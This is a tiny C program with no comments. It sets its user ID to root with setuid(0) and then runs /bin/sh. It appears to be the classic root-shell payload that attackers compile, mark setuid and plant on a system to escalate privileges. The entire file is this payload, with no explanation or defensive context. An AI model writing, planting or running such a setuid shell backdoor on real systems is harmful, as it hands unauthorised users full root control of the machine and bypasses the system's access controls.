#include <stdlib.h>
#include <unistd.h>
void main()
{
setuid(0);
system("/bin/sh");
}